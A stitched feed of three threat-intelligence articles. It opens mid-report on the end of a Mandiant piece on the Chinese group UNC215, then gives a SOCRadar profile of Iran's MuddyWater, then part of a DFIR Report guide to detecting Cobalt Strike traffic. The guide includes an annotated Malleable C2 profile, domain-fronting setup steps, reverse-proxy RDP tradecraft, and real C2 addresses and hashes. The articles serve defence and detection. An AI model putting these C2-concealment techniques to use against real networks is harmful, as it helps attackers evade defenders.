UAE iceland a78c53351e23d3f84267e67bbca6cf07 206.189.123.156 Israel (IT) idapro a78c53351e23d3f84267e67bbca6cf07 206.189.123.156 Israel (IT) galway 04c51909fc65304d907b7cb6c92572cd 
159.65.80.157 Unknown galway 0e061265c0b5998088443628c03188f0 159.65.80.157 
Unknown galway 09ffc31a432f646ebcec59d32f286317 
159.65.80.157 Unknown galway 6ca8993b341bd90a730faef1fb73958b 
128.199.44.86 Unknown Helen * Unknown 46.101.255.16 Iran Helen * Unknown 178.79.143.78 Iran Idapro * Unknown 138.68.154.133 Iran Table 1: FOCUSFJORD comparison (note: the * entries are from public reporting and have not been verified by Mandiant) False Flags Artifacts in UNC215 campaigns often contain foreign language strings that do not match the country being targeted and may be intended to mislead an analyst examining the malware.
Additionally, on at least three occasions, UNC215 employed a custom tool associated with Iranian actors whose source code was leaked. 
In several cases, we identified FOCUSFJORD samples with registry key names in regional languages.
The registry key names are hardcoded into every FOCUSFJORD sample, as the malware needs to read and decrypt those registry key values for proper execution. 
FOCUSFJORD samples (MD5: d13311df4e48a47706b4352995d67ab0 and MD5: 26d079e3afb08af0ac4c6d92fd221e71) observed on Israeli and UAE networks, and a memory dump (MD5: d875858dbd84b420a2027ef5d6e3a512) submitted to a public malware repository by a likely Uzbekistan financial organization are configured with registry keys in Farsi.
Linguistic analysis suggests that these terms were auto translated as they are not commonly used by native Farsi speakers.
Another FOCUSFJORD sample uploaded from Uzbekistan (MD5: ac431261b8852286d99673fddba38a50) contains a configuration with registry key names in Hindi.
Notably, this variant also contains an error message string in Arabic ('ضائع' – which translates to: lost or missing). 
In April 2019, UNC215 deployed the SEASHARPEE web shell against financial and high-tech organizations in the Middle East and Asia.
The SEASHARPEE web shell was developed and used by Iranian APT actors until the code was leaked online in the telegram channel Lab Dookhtegan a few weeks earlier in March 2019.
Around this time, the Turkish-language file Sosyal Güvenlik Reformu-Not-3.doc "Social Security Reform - Note - 3.doc" (MD5: 6930bd66a11e30dee1ef4f57287b1318) was distributed to a suspected Turkish government entity based on data from an open-source malware repository.
The document contains "C:\Users\Iran" paths that were likely included to obfuscate the source of the activity. 
The use of Farsi strings, filepaths containing /Iran/, and web shells publicly associated with Iranian APT groups may have been intended to mislead analysts and suggest an attribution to Iran. 
Notably, in 2019 the government of Iran accused APT27 of attacking its government networks and released a detection and removal tool for HYPERBRO malware. 
Tradecraft Mistakes While UNC215 prioritizes evading detection within a compromised network, Mandiant identified several examples of code, C2 infrastructure, and certificate reuse indicating that UNC215 operators are less concerned about defenders’ ability to track and detect UNC215 activity. 
In several instances, UNC215 used the same exact file against multiple victims and frequently shared infrastructure across victims.
This lack of compartmentalization is not uncommon, but does show that UNC215 is relatively less concerned about the ability for their compromises to be linked to each other.
C2 servers used by UNC215 frequently reuse the same SSL certificate, as described in Team Cymru’s research in 2020.
On one network, between April 2019 and April 2020, an operator repeatedly and infrequently revisited a compromised network whenever an Endpoint Detection and Response (EDR) tool detected or quarantined tools like HYPERBRO and Mimikatz.
After several months of repeated detections, UNC215 deployed an updated version of HYPERBRO and a tool called “anti.exe” to stop Windows Update service and terminate EDR and Antivirus related services. 
Attribution Mandiant attributes this campaign to Chinese espionage operators which we track as UNC215 a Chinese espionage operation that has been suspected of targeting organizations around the world since at least 2014.
We have low confidence that UNC215 is associated with APT27. 
UNC215 has compromised organizations in the government, technology, telecommunications, defense, finance, entertainment, and health care sectors.
The group targets data and organizations which are of great interest to Beijing's financial, diplomatic, and strategic objectives. 
Outlook and Implications 
The activity detailed in this post demonstrates China’s consistent strategic interest in the Middle East.
This cyber espionage activity is happening against the backdrop of China’s multi-billion-dollar investments related to the Belt and Road Initiative (BRI) and its interest in Israeli’s robust technology sector. 
Chinese companies have invested billions of dollars into Israeli technology startups, partnering or acquiring companies in strategic industries like semi-conductors and artificial intelligence.
As China’s BRI moves westward, its most important construction projects in Israel are the railway between Eilat and Ashdod, a private port at Ashdod, and the port of Haifa. 
China has conducted numerous intrusion campaigns along the BRI route to monitor potential obstructions—political, economic, and security—and we anticipate that UNC215 will continue targeting governments and organizations involved in these critical infrastructure projects in Israel and the broader Middle East in the near- and mid-term. MITRE ATT&CK Techniques ID Technique T1003.001 OS Credential Dumping: LSASS Memory T1007 System Service Discovery T1010 Application Window Discovery T1012 Query Registry T1016 System Network Configuration Discovery T1021.001 Remote Services: Remote Desktop Protocol T1027 Obfuscated Files or Information T1033 
System Owner/User Discovery T1055 Process Injection T1055.003 Process Injection: Thread Execution Hijacking T1055.012 Process Injection: Process Hollowing T1056.001 Input Capture: Keylogging T1057 Process Discovery T1059.001 Command and Scripting Interpreter: 
PowerShell T1059.003 Command and Scripting Interpreter: Windows Command Shell T1070.004 Indicator Removal on Host: File Deletion T1070.006 Indicator Removal on Host: Timestomp T1071.001 Application Layer Protocol: Web Protocols T1078 Valid Accounts T1082 System Information Discovery T1083 File and Directory Discovery T1087 Account Discovery T1090 Proxy T1095 Non-Application Layer Protocol T1098 Account Manipulation T1105 
Ingress Tool Transfer T1112 
Modify Registry T1113 Screen Capture T1115 Clipboard Data T1133 External Remote Services T1134 Access Token Manipulation T1140 
Deobfuscate/Decode Files or Information T1190 
Exploit Public-Facing Application T1199 Trusted Relationship T1202 Indirect Command Execution T1213 Data from Information Repositories T1482 Domain Trust Discovery T1489 
Service Stop T1497 Virtualization/Sandbox Evasion T1497.001 Virtualization/Sandbox Evasion: System Checks T1505.003 Server Software Component: Web Shell T1518 Software Discovery T1543.003 Create or Modify System Process: Windows Service T1547.001 Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder T1553.002 Subvert Trust Controls: Code Signing T1559.002 Inter-Process Communication: Dynamic Data Exchange T1560 
Archive Collected Data T1564.003 
Hide Artifacts: Hidden Window T1569.002 System Services: Service Execution T1573.002 Encrypted Channel:
Asymmetric Cryptography T1574.002 Hijack Execution Flow: DLL Side-Loading T1583.003 Acquire Infrastructure: Virtual Private Server T1588.003 Obtain Capabilities: Code Signing Certificates T1608.003 Stage Capabilities: Install Digital Certificate Indicators of Compromise 
The following indicators have been seen in use with the noted malware families, but not all have been confirmed to be used by UNC215. Type Value Description IP 85.204.74.143 HYPERBRO C2 IP 103.79.78.48 HYPERBRO C2 IP 89.35.178.105 HYPERBRO C2 IP 47.75.49.32 HYPERBRO C2 IP 139.59.81.253 
FOCUSFJORD C2 IP 34.65.151.250 FOCUSFJORD C2 IP 159.89.168.83 FOCUSFJORD C2 IP 103.59.144.183 
FOCUSFJORD C2 IP 141.164.52.232 
FOCUSFJORD C2 Detecting the Techniques FireEye detects this activity across our platforms. 
Platform(s) Detection Name Network Security Email Security Detection On Demand Malware Analysis File Protect Backdoor.
Win32.HyperBro.
FEC3 FE_APT_Backdoor_Win32_HYPERBRO_1 FE_Downloader_Win32_FOCUSFJORD_2 FE_Trojan_Raw32_SILKWRAP_1 Trojan.
Win32.LuckyMouse.
FEC3 FE_Trojan_Raw32_SILKWRAP_1 33341691_APT.Downloader.
Win.
FOCUSFJORD Trojan.Win32.DllHijack.
FEC3 FE_Trojan_Raw32_SILKWRAP_1 FE_Autopatt_Win_FOCUSFJORD Trojan.
Generic FE_Tool_Win_Generic_3 FE_Tool_Win32_Generic_3 FE_Trojan_Win_Generic_154 FE_Trojan_Win32_Generic_403 FE_Trojan_Win_Generic_155 FE_Trojan_Win64_Generic_54 FE_APT_Backdoor_Win32_HYPERBRO_2 FE_Trojan_Win32_Generic_404 FE_Trojan_Win32_Generic_406 Suspicious File Config Suspicious Regkey Added Suspicious Process Launch Activity Suspicious Codeinjection Activity Suspicious Process Delete Activity Suspicious Process Hijacking Activity Suspicious Process Self Deletion Activity Endpoint Security Generic.mg.a0b2193362152053 Generic.mg.26d079e3afb08af0 Generic.mg.28ce8dbdd2b7dfd1 Generic.mg.04c51909fc65304d Generic.mg.0e061265c0b59980 Generic.mg.09ffc31a432f646e Generic.mg.6ca8993b341bd90a Generic.mg.0ec4d0a477ba21bd Generic.mg.04dece2662f648f6 Trojan.
GenericKD.43427954 Gen:Variant.
Ursu.933105 Trojan.GenericKD.32762213 Trojan.GenericKD.34854595 Gen:Variant.
Ursu.256631 Gen:Variant.Doina.16603 Gen:Variant.
Doina.13437 
Helix 1.1.2927.fireeye_intel_hit_ip 1.1.2928.fireeye_intel_hit_ip 1.1.2929.fireeye_intel_hit_ip 1.1.2930.fireeye_intel_hit_ip 1.1.2947.fireeye_intel_hit_hash 1.1.2948.fireeye_intel_hit_hash 1.1.2949.fireeye_intel_hit_hash 1.1.2950.fireeye_intel_hit_hash 1.1.1404.windows_methodology_unusual_web_server_child_process 1.1.3506.windows_methodology_adfind 1.1.1650.windows_methodology_mimikatz_args 1.1.1651.antivirus_methodology_mimikatz 1.1.1652.windows_methodology_invokemimikatz_powershell_artifacts 
title: Dark Web Profile: MuddyWater APT Group url: https://socradar.io/dark-web-profile-muddywater-apt-group/ By SOCRadar Research Security concerns grow day by day with the rise of cyberattacks.
Among the threats, cyber espionage is one of the prominent activities.
It can be used to get a hold of sensitive or classified data that may be intellectual property, government, or trade secrets.
The threat actors’ goals might be financial gain, reputational harm, political interests, or cyberwarfare.
Today, we’ll review a high-profile cyber espionage group MuddyWater. 
Who is MuddyWater? Stuxnet was a big hit on Iran’s nuclear program in 2010.
Iran took that as a wake-up call and began investing in and improving its cyberwarfare capabilities.
In 2011, Iranian threat actors began to be involved in sophisticated attacks.
One area they focused on is cyber espionage campaigns.
The first major campaign was observed in 2012, called the Madi campaign. 
Operation categories of MuddyWater MuddyWater, also known as Static Kitten, UNC3313, or MERCURY, is an Iranian state-sponsored APT group.
According to the FBI and other US and UK-based agencies, they operate as a subordinate element of the Iranian Ministry of Intelligence and Security (MOIS).
It is believed that they have been active since late 2017 and have been in close contact with MOIS since 2018. 
MuddyWater was observed to be conducting malicious activities across Europe, Asia, Africa, and North America.
However, their main focus primarily resides on the middle east, per other Iranian threat actors.
They are targeting private and government organizations listed below: Defense Education Energy Financial Services Government and administration agencies Healthcare High-Tech International Organizations Media Countries affected by MuddyWater 
They are primarily conducting cyber espionage activities and intellectual property (IP) theft attacks, but on some occasions, they have deployed ransomware on the targets.
However, it is believed they deployed ransomware to cover their tracks. 
How does MuddyWater Attack? 
MuddyWater’s arsenal is vast.
The group exploits various known vulnerabilities and uses a wide range of tools. 
For initial access, the group commonly leverages spear-phishing and tries to trick the victims into opening malicious documents hosted in commercial file-sharing services.
After obtaining initial access, they usually drop web shell and gain local administrator access on the infected machine.
On the compromised machine, they use tools such as Mimikatz to dump credentials.
To broaden the compromise, they laterally move by leveraging in-built or deployed tools within the network. 
MuddyWater generally uses DNS to communicate with their C2 servers while using tools such as PowerShell, vpnui[.]exe (a unique version of Ligolo), and remote monitoring software such as ScreenConnect, Remote Utilities, and eHorus. 
The figure below shows an instance of the MuddyWater attack chain observed by Microsoft. 
MuddyWater attack chain (Source: Microsoft) 
Which Tools and Vulnerabilities MuddyWater Use? PowGoop DLL Loader: PowGoop malware is a malicious DLL loader.
It disguises itself as a legitimate Google Update executable. 
Small Sieve: 
Small Sieve is a simple Python backdoor used to distribute Nullsoft Scriptable Install System (NSIS) installer. 
Canopy: Canopy is a spyware.
It collects the victim’s username, computer name, and IP address and sends it to the MuddyWater group.
Canopy malware is also known as Starwhale malware. 
Mori: Mori is a backdoor that uses Domain Name System tunneling to communicate with the group’s C2 infrastructure. 
POWERSTATS: 
POWERSTATS is a backdoor that runs PowerShell scripts to maintain persistent access on the victim systems. 
MuddyWater-associated tools & vulnerabilities provided by SOCRadar Who Did MuddyWater Target in Their Campaigns? MuddyWater campaign timeline MuddyWater’s targets are mostly the neighbors of Iran in the middle east region.
If we analyze the graphic below, we can see that Turkey, Israel, Iraq, UAE, and Pakistan are among the top targets of MuddyWater.
Observations may show that MuddyWater acts according to the political interests of the Iranian state through the connection of MOIS.
So, countries in which Iran has political interests should be aware of MuddyWater’s cyber espionage campaigns. 
Countries targeted by MuddyWater Motivations Behind MuddWater’s Attacks in the Last 2 Years 
In September 2020, a series of agreements called the Abraham Accords were signed between Israel, United Arab Emirates, and Bahrain.
These countries signed these agreements intending to normalize diplomatic relations in the region.
The US brokered the agreements, a major diplomatic breakthrough in the Middle East. 
The Abraham Accords can be an improvement in the region from a neutral point of view, but some may feel uneasy about these agreements.
In particular, Iran may have felt concerned about the Abraham Accords because they could lead to closer ties between Israel and other countries in the region, potentially undermining Iran’s influence. 
With these developments in mind, we may deduce that the cyber-espionage activities carried out by MuddyWater between September 2020 and March 2021 were a reaction to these agreements.
MuddyWater, as far as known, primarily conducted campaigns in the middle east and its neighboring regions in late 2020 and early 2021. 
September 2020 – Operation Quicksand – Israel: According to ClearSky, MuddyWater targeted many prominent Israeli organizations.
In this specific campaign, security researchers observed that the threat actor used a variant of Shamoon to encrypt data.
However, it is believed that the intent of using Shamoon was not to deploy ransomware but to disrupt operations. 
Operation Quicksand (Source: SOCRadar) March 2021 – Earth Vetala Campaign:
According to Trend Micro, Azerbaijan, Bahrain, Israel, Saudi Arabia, and the United Arab Emirates were the targets of the campaign.
Government agencies, academia, and tourism were some of the targeted sectors. 
Latest Attacks of the Threat Actor In January 2022, cybersecurity researchers reported that MuddyWater targeted Turkish private organizations and governmental agencies.
They used multiple malicious PDFs and MS Office documents during the campaign.
With the spear phishing technique, the threat actors tried to convince the victims that the documents were from the Turkish Health and Internal Affairs Ministries. 
Malicious PDF used in Turkey campaign (Source: Cisco Talos) 
In another incident on December 2022, Deep Instinct reported that MuddyWater, conducted malicious activities, again using spear phishing through emails.
Israeli insurance companies were the targets of the attacks.
As an evolving threat actor, they added a new tool for remote access, Syncro, to their arsenal. 
Email from MuddyWater’s Israel attack (Source: Deep Instinct) Conclusion Observations of MuddyWater’s cyber espionage activities can lead to a conclusion that they act according to Iran’s political strategies through MOIS.
Whether it is because of the political implications, or another reason, Israel and Turkey seem to be significant targets for the MuddyWater. 
If you are an organization residing in the middle east, there might be a possibility of being a target of MuddyWater.
What can you do to defend against them?
Excluding the technical mitigations, keeping up with the political climate of the middle east region might give a heads-up if the tension rises.
On the technical side, MuddyWater evolves with each attack they perform, but they still bear similar techniques.
You can apply the following recommendations per your needs. 
Security Recommendations Against MuddyWater MuddyWater leverages spear phishing.
Provide necessary training to your employees for security awareness. 
Gain visibility into external-facing digital assets with an Attack Surface Management solution. 
Regularly apply security patches and software updates. 
Apply the least privilege principle across the network, especially to critical systems and services Secure domain controllers (DC) using best practices. 
Enable multifactor authentication (MFA) to prevent lateral movement. 
Refer to IOCs and take necessary actions toward mitigation. 
SOCRadar’s Attack Surface Management provides visibility into external-facing digital assets.
SOCRadar has a predictive, preventive, and proactive approach toward security at its core.
With SOCRadar’s Attack Surface Management, security teams can track which CVEs are present in the environment.
Knowing which CVEs are present in the organization can give the organization an advantage in defending against MuddyWater. 
SOCRadar Attack Surface Management Most threat actors specializing in cyber espionage widely leverage spear phishing, just as MuddyWater does.
If you receive any suspicious email, you can use free SOC Tools on SOCRadar Labs to analyze it. 
SOCRadar SOC Tools provided by SOCRadar Labs MITRE ATT&CK Techniques Techniques ID Reconnaissance Gather Victim Identity Information: Email Addresses T1589.002 Resource Development Acquire Infrastructure: Web Services T1583.006 Obtain Capabilities: Tool T1588.002 Initial Access Phishing:
Spearphishing Attachment T1566.001 
Phishing:
Spearphishing Link T1566.002 Execution Windows Management Instrumentation T1047 Command and Scripting Interpreter:
PowerShell T1059.001 Command and Scripting Interpreter:
Windows Command Shell 1.059.003 Command and Scripting Interpreter:
Visual Basic T1059.005 Command and Scripting Interpreter: Python T1059.006 Command and Scripting Interpreter:
JavaScript T1059.007 Exploitation for Client Execution T1203 User Execution: Malicious Link T1204.001 User Execution: Malicious File T1204.002 Inter-Process Communication: Component Object Model T1559.001 Inter-Process Communication: Dynamic Data Exchange T1559.002 Persistence Scheduled Task/Job: Scheduled Task T1053.005 Office Application Startup: Office Template Macros T1137.001 Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder T1547.001 Privilege Escalation Abuse Elevation Control Mechanism: Bypass User Account Control T1548.002 Credentials from Password Stores T1555 Credentials from Web Browsers T1555.003 Defense Evasion Obfuscated Files or Information T1027 Steganography T1027.003 Compile
After Delivery T1027.004 Masquerading: Match Legitimate Name or Location T1036.005 Deobfuscate/Decode Files or Information T1140 Signed Binary Proxy Execution: CMSTP T1218.003 Signed Binary Proxy Execution: Mshta T1218.005 Signed Binary Proxy Execution: Rundll32 T1218.011 Execution Guardrails T1480 Impair Defenses:
Disable or Modify Tools T1562.001 Credential Access OS Credential Dumping: LSASS Memory T1003.001 OS Credential Dumping: LSA Secrets T1003.004 OS Credential Dumping: Cached Domain Credentials T1003.005 Unsecured Credentials: Credentials In Files T1552.001 Discovery System Network Configuration Discovery T1016 System Owner/User Discovery T1033 System Network Connections Discovery T1049 Process Discovery T1057 System Information Discovery T1082 File and Directory Discovery T1083 Account Discovery: Domain Account T1087.002 Software Discovery T1518 Security Software Discovery T1518.001 Collection Screen Capture T1113 Archive Collected Data: Archive via Utility T1560.001 Command and Control Application Layer Protocol: Web Protocols T1071.001 Proxy: External Proxy T1090.002 Web Service:
Bidirectional Communication T1102.002 Multi-Stage Channels T1104 Ingress Tool Transfer T1105 Data Encoding: Standard Encoding T1132.001 Data Encoding: Non-Standard Encoding T1132.002 Remote Access Software T1219 Exfiltration Exfiltration Over C2 Channel T1041 Appendix: Appendix 1: IOCs of PowGoop goopdate[.]dll MD5: a27655d14b0aabec8db70ae08a623317 SHA-1: 7649c554e87f6ea21ba86bb26ea39521d5d18151 SHA-256: 2c92da2721466bfbdaff7fedd9f3e8334b688a88ee54d7cab491e1a9df41258f File type: Win32 DLL File size: 88.50 KB (90624 bytes) vcruntime140[.]dll MD5: cec48bcdedebc962ce45b63e201c0624 SHA-1: 81f46998c92427032378e5dead48bdfc9128b225 SHA-256: dd7ee54b12a55bcc67da4ceaed6e636b7bd30d4db6f6c594e9510e1e605ade92 File type: Win32 DLL File size: 91.50 KB (93696 bytes) IOCs 104.208.16[.]94:443 (TCP) 20.42.65[.]92:443 (TCP) 20.42.73[.]29:443 (TCP) libpcre2-8-0[.]dll MD5: 860f5c2345e8f5c268c9746337ade8b7 SHA-1: 6c55d3acdc2d8d331f0d13024f736bc28ef5a7e1 SHA-256: 9d50fcb2c4df4c502db0cac84bef96c2a36d33ef98c454165808ecace4dd2051 File type: Win32 DLL File size: 94.50 KB (96768 bytes) IOCs 20.189.173[.]20:443 (TCP) 20.189.173[.]21:443 (TCP) 20.42.73[.]29:443 (TCP) Appendix 2: IOCs of Small Sieve gram_app[.]exe MD5: 15fa3b32539d7453a9a85958b77d4c95 SHA-1: 11d594f3b3cf8525682f6214acb7b7782056d282 SHA-256: b75208393fa17c0bcbc1a07857686b8c0d7e0471d00a167a07fd0d52e1fc9054 File type: Win32 EXE File size: 16.21 MB (16999598 bytes) IOCs 13.107.4[.]50:80 (TCP) 149.154[.]167.220:443 (TCP) 192.168.0[.]15:137 (UDP) 23.216.147[.]64:443 (TCP) 23.216.147[.]76:443 (TCP) a83f:8110:0:0:1400:1400:2800[:]3800:53 (UDP) 
index[.]exe MD5: 5763530f25ed0ec08fb26a30c04009f1 SHA-1: 2a6ddf89a8366a262b56a251b00aafaed5321992 SHA-256: bf090cf7078414c9e157da7002ca727f06053b39fa4e377f9a0050f2af37d3a2 File type: Win32 EXE File size: 16.46 MB (17263089 bytes) IOCs 13.107.4[.]50:80 (TCP) 192.168.0[.]1:137 (UDP) 192.168.0[.]25:137 (UDP) 20.99.132[.]105:443 (TCP) 209.197.3[.]8:80 (TCP) 23.216.147[.]64:443 (TCP) a83f:8110:0:0:7f00:0:0[:]0:53 (UDP) a83f:8110:492a:
d801:d1df:1328:492a[:]d801:53 (UDP) a83f:8110:5067:d801:beac:bf78:cce1[:]d301:53 (UDP) Appendix 3: IOCs of Canopy Cooperation terms[.]xls MD5: b0ab12a5a4c232c902cdeba421872c37 SHA-1: a8e7659942cc19f422678181ee23297efa55fa09 SHA-256: 026868713d60e6790f41dc7046deb4e6795825faa903113d2f22b644f0d21141 File type: MS Excel Spreadsheet File size: 247.00 KB (252928 bytes) IOCs 88.119.170[.]124:80 (TCP) ZaibCb15Ak[.]xls MD5: 6cef87a6ffb254bfeb61372d24e1970a SHA-1: e21d95b648944ad2287c6bc01fcc12b05530e455 SHA-256: 4b2862a1665a62706f88304406b071a5c9a6b3093daadc073e174ac6d493f26c File type: MS Excel Spreadsheet File size: 249.00 KB (254976 bytes) IOCs 5.199.133[.]149:80 (TCP) Appendix 4:IOCs of Mori FML[.]dll MD5: 0431445d6d6e5802c207c8bc6a6402ea SHA-1: 3765c1ad8a1d936aad88255aef5d6d4ce24f94e8 SHA-256: 3098dd53da40947a82e59265a47059e69b2925bc49c679e6555d102d1c6cbbc8 File type: Win32 DLL File size: 200.65 MB (210397496 bytes) 
Appendix 5:IOCs of POWERSTATS LisfonService[.]exe MD5: f5dee1f9cd47dc7bae468da9732c862e SHA-1: 5273ee897e67fc01ee5fef08c37400cb4ee15958 SHA-256: 6f8226d890350943a9ef4cc81598e0e953d8ba9746694c0b7e3d99e418701b39 File type: Win32 EXE File size: 119.00 KB (121856 bytes) TestService[.]exe MD5: e75443a5e825f69c75380b6dc76c6b50 SHA-1: 142b5753c608c65e702e41b52abdeb96cb2f9294 SHA-256: c514c3f293f0cb4c23662a5ab962b158cb97580b03a22b82e21fa3b26d64809c File type: Win32 EXE File size: 92.50 KB (94720 bytes) IOCs 13.107.4.50:80 (TCP) a83f:8110:e0:ffff:e0:ffff:e0[:]ffff:53 (UDP) The post Dark Web Profile: MuddyWater APT Group appeared first on SOCRadar:registered: Cyber Intelligence Inc.. 
title: Cobalt Strike, a Defender’s Guide – Part 2 url: https://thedfirreport.com/2022/01/24/cobalt-strike-a-defenders-guide-part-2/ Our previous report on Cobalt Strike focused on the most frequently used capabilities that we had observed.
In this report, we will focus on the network traffic it produced, and provide some easy wins defenders can be on the look out for to detect beaconing activity.
We cover topics such as domain fronting, SOCKS proxy, C2 traffic, Sigma rules, JARM, JA3/S, RITA & more. 
As with our previous article, we will highlight the common ways we see threat actors using Cobalt Strike. 
Big shout-out to @Kostastsale for helping put this Part 2 together!
Also thanks to @svch0st, @pigerlin, and @0xtornado for reviewing this report. 
Even though network monitoring and detection capabilities do not come easy for many organizations, they can generally offer a high return on investment if implemented correctly.
Malware has to contact its C2 server if it is to receive further instructions.
This article will demonstrate how to detect this communication before threat actors accomplish their objectives.
There are a couple of factors that we can utilize to fingerprint any suspicious traffic and subsequent infrastructure.
Before we get into that part, we should first discuss what makes Cobalt Strike so versatile. 
Cobalt Strike’s versatility comes from the ability to change the indicators with each payload.
This is made possible thanks to Malleable C2 profiles.
Our other post touched on Malleable C2 profiles and how threat actors use them; however, that was just some of their many applications.
Below you can find information related to some of the most important fields that could throw off an analyst while investigating a Cobalt Strike network communication: 
The reference profile below is taken from Raphael Mudge’s GitHub repository. 
###Global Options### set sample_name "whatever.profile"; set sleeptime "0"; <================ # Decimal number to indicate the time the beacon will sleep for between communications in milliseconds set jitter "25"; <================ # A number that indicates the percentage of a random sleep time that beacon will introduce to its C2 comm set useragent "<string>"; <================ # Custom user agent of your choice set data_jitter "35"; <================ # Represents the value bytes variable that would instruct Cobalt Strike to send a random string on http-get/post to match the bytes value. 
set headers_remove "<header to remove>"; <================ # Specifying headers to be removed in a comma separated manner. 
####### Not much explanation is needed here, you can change the certificate information to your heart's content.
####### https-certificate { set C "US"; set CN "whatever.com"; set L "California"; set O "whatever LLC.
"; set OU "local.org"; set ST "CA"; set validity "365"; } ###HTTP-Config Block### http-config { set headers "<headers to include>"; <================ # Specifying the headers that you want to include. header "<name of the header(s)>"; <================ # Specifying the name of the header that will store the data that are transmitted to the C2 server set trust_x_forwarded_for "<true OR false>"; <================ # If the C2 server is behind a redirector, this option would allow to forward the traffic to the correct destination set block_useragents "<user agents>"; <================ # User agents that C2 server will block and show a 404 response set allow_useragents "<user agents>" <================ # Opposite of the above } ###HTTP-GET Block.
This function and all of its fields could also exist and be customized for the HTTP-POST Block (Server communication)### http-get { set uri "/<URI string>"; <================ # Specifying the URI to reference in bidirectional communication from client and server set verb "POST"; <================ # Setting the verb when requesting available tasks from the C2 server. 
client { header "Host" "whatever.com"; <================ # Setting the header specific to client communication with the C2. 
header "Connection" "close"; ### Metadata corresponds to the information that the beacon is sending to the C2 server about itself.
The operators may choose to enable additional fields that will include data on the C2 communication.
You can mix and match fields below: metadata { #base64; <================ # Base64 encoded string base64url; <================ # URL safe Base64 encoded string #mask; <================ # Encrypting and encoding the data with XOR mask and random key #netbios; <================ # Encoding data as netbios in lower case #netbiosu; <================ # Another variation of netbios encoding #prepend "TEST123"; <================ # Choosing a string to prepend to the transmitted data append ".php"; <================ # Choosing a string to append ### Termination statements: This statement tells Beacon and its server wherein the transaction to store the transformed data.
You may choose one of these termination statement methods. 
parameter "file"; <================ # Adding a parameter to the URI. 
#header "Cookie"; <================ # Adding a specific string within a specific header. 
#uri-append; <================ # Adding a specific string in the URI. 
#print; } parameter "test1" "t We added comments to the profile above to explain the numerous fields operators can change to customize the profile to their needs.
All these different fields provide control and flexibility over the indicators of the C2 channel.
Many free, open-source randomizer scripts exist to create a unique profile such as Random C2 Profile Generator by @joevest, Malleable-C2-Randomizer by @bluscreenofjeff, and C2concealer by @FortyNorthSec. 
Below are some of the Cobalt Strike C2 servers that we observed during intrusions.
On the right column, we show the URLs that the Cobalt Strike payloads were configured to query.
A trained eye could spot some of the Malleable profiles that exist on freely available resources such as Raphael Mudge’s list on his GitHub page.
Another example is the “jquery-3.3.1.min.js” which is associated with this malleable C2 profile as we observed in four intrusions. 
+----------------------+-----------------------+ | C2 Server | URI queried | 
+----------------------+-----------------------+ | gawocag.com | /nd 
| | 190.114.254.116 | /push | | 190.114.254.116 | /__utm.gif | | kaslose.com | /jquery-3.3.1.min.js | | yawero.com | /skin.js | | sazoya.com | /skin.js | | 192.198.86.130 | /skin.js | | 162.244.83.216 | /jquery-3.3.1.min.js | | sammitng.com | /jquery-3.3.1.min.js | | 23.19.227.147 | /styles.html 
| | securityupdateav.com | /tab_shop_active.html
| | 108.62.118.247 | /as 
| | windowsupdatesc.com | /as | | 212.114.52.180 | /copyright.css | | defenderupdateav.com | /default.css | | onlineworkercz[.]com | /kj | | checkauj.com | /jquery-3.3.1.min.js 
| +----------------------+-----------------------+ A deep dive into all available fields can be found on this post from @ZephrFish.
He also includes other fields related to post-exploitation beacon configuration along with network communication-related fields.
Another great resource is this article released by SpecterOps. 
Domain Fronting Domain fronting is another method for concealing communication between the endpoint and the command and control servers.
The main purpose of domain fronting is to connect to a restricted host while pretending to communicate with an allowed host.
It essentially masks your traffic to a certain website by masquerading it as a different domain. 
This technique is possible thanks to Content Delivery Networks (CDNs).
Domain fronting was mostly used by web services to bypass censorship in several countries that restricted traffic (e.g., China).
In recent years, attackers have started using this technique to hide their malicious infrastructure behind legitimate domains.
Because domain fronting is a complicated topic to grasp, below we have included an image from the official Cobalt Strike page that discusses this technique. 
Cobalt Strike made domain fronting possible by allowing the operators to configure related settings via the malleable C2 profiles.
The following prerequisites must be met in order for domain fronting to be possible: Own a domain.
(e.g., infosecppl.store) Pick one of the many web services that provide CDN capabilities.
(e.g., cloudfront.net). 
Setup the CDN service to create a new CDN endpoint and redirect traffic to your domain.
(e.g., l33th4x0r.cloudfront.net). 
Setup a profile to facilitate domain fronting. 
Identify a domain that uses the same CDN to ensure that the traffic will be forwarded to the correct resource. 
Step five is where things get interesting.
Attackers can use legitimate domains that are registered under the same CDN provider.
As demonstrated in the screenshot above, all they have to do is include their CDN endpoint domain (created in step three) in the host header of the request.
In that way, the legitimate website will forward the traffic through the CDN to the original destination according to the host header. 
In the screenshots below, you can see how the malleable C2 profiles are configured to allow domain fronting using the Fastly and AzureEdge CDNs: 
This research paper released by academics from the University of California, Berkeley, is a great introduction to domain fronting.
This paper inspired many researchers to expand the possibilities of this unique way of hiding the final destination server on web traffic.
One of those researchers is Vincent who wrote a great article on domain fronting.
He explains in simple terms how it works.
He also published a Python script to identify possible domains that can be leveraged for domain fronting. 
Looking into our reporting, we don’t see many instances of domain fronting.
This is most likely due to the complex process of setting up the necessary infrastructure.
Although, based on the data we have collected regarding malicious infrastructure, domain fronting appears to be used by threat actors.
According to our data from early 2021 up to now, Amazon Cloudfront takes the lead on preferable CDN used by threat actors, by a large margin. 
The data above is available via our services.
More information on this service and others can be found here. 
Reverse Proxy using Cobalt Strike Beacon A technique that we come across often is a reverse proxy.
We see instances where threat actors use their beacon sessions to establish RDP access through a reverse proxy.
Cobalt Strike has the ability to run a SOCKS proxy server on the team server.
This enables the operators to setup a listening port and leverage it to relay traffic to and from the open beacon session.
The screenshot below demonstrates this implementation. 
Image credit: cobaltstrike.com Some of the cases we have observed threat actors using reverse proxy are: Diavol Ransomware BazarLoader and the Conti Leaks Snatch Ransomware 
In most, of the above cases, the aim of the attackers was to establish a Remote Desktop session.
There are numerous advantages to establishing a RDP session, including the ability to navigate using a graphical environment and easily move laterally once the necessary access has been granted. 
Below, we demonstrate how attackers take advantage of this technique using proxychains from the attackers’ kali Linux host.
In the first image, the attackers open a socks listening port, in this case port 8888, on the Cobalt Strike team server. 
Creating the listening port (TCP port 8888) 
In this second image, we employ proxychains from the attacker’s Kali Linux host to RDP into our target’s environment via the SOCKS server.
We essentially add the team server’s IP address into the proxychains configuration and connect with xfreerdp. 
RDP into the target host using reverse proxy Looking into the generated artifacts, we can see that a 4624 type 3 event is created on the target host.
